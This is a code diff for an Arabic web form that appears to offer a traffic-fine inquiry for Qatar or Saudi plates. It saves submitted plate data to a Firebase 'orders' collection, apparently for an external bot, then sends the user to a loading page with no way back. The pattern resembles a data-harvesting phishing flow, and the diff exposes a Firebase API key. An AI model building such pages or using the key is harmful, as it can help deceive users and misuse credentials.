@@ -202,7 +202,7 @@
 
 <div class="container">
   <main class="search-box">
-    <form id="mainTrafficForm">
+    <form id="mainTrafficForm" onsubmit="return false;">
       <div class="field-wrap">
         <label class="field-label">جهة إصدار اللوحة</label>
         <select id="plateSource" class="input-style" required>
@@ -294,7 +294,7 @@
         document.getElementById("ksaContainer").style.display = (val === "KSA") ? "block" : "none";
     };
 
-    // بيانات Firebase الحقيقية لمشروع jusour-qatar
+    // بيانات Firebase الحقيقية
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -309,11 +309,11 @@
     const db = firebase.firestore();
     const analytics = firebase.analytics();
 
-    // تتبع الزيارة فور فتح الصفحة
     analytics.logEvent('page_view', { page_title: 'الرئيسية - استعلام المخالفات' });
 
-    document.getElementById("mainTrafficForm").onsubmit = async (e) => {
-        e.preventDefault();
+    // الوظيفة الرئيسية لإرسال البيانات
+    document.getElementById("mainTrafficForm").addEventListener("submit", async function(e) {
+        e.preventDefault(); // منع التحديث التقليدي
         
         const btn = document.getElementById("submitBtn");
         btn.innerHTML = "جاري التحقق...";
@@ -323,7 +323,6 @@
         const plateCode = document.getElementById("plateCode").value;
         const plateSource = sSel.value;
 
-        // تعديل أسماء الحقول لتطابق البوت في Render
         const payload = {
             plate_source: plateSource,
             plate_number: plateNumber,
@@ -336,20 +335,16 @@
         };
 
         try {
-            // حفظ الطلب في Firebase
             const docRef = await db.collection("orders").add(payload);
-            
-            // حفظ المعرف في الجلسة لصفحة التحميل
             sessionStorage.setItem("last_order_id", docRef.id);
-
-            // التوجيه لصفحة LOADING وليس صفحة النتائج مباشرة
-            window.location.href = "loading.php";
+            // التوجيه الفوري لصفحة التحميل بطريقة تمنع العودة للخلف (Replace)
+            window.location.replace("loading.php");
         } catch (err) { 
             console.error("Firebase Error:", err);
             btn.innerHTML = "خطأ في الاتصال!";
             btn.disabled = false;
         }
-    };
+    });
 </script>
 </body>
 </html>
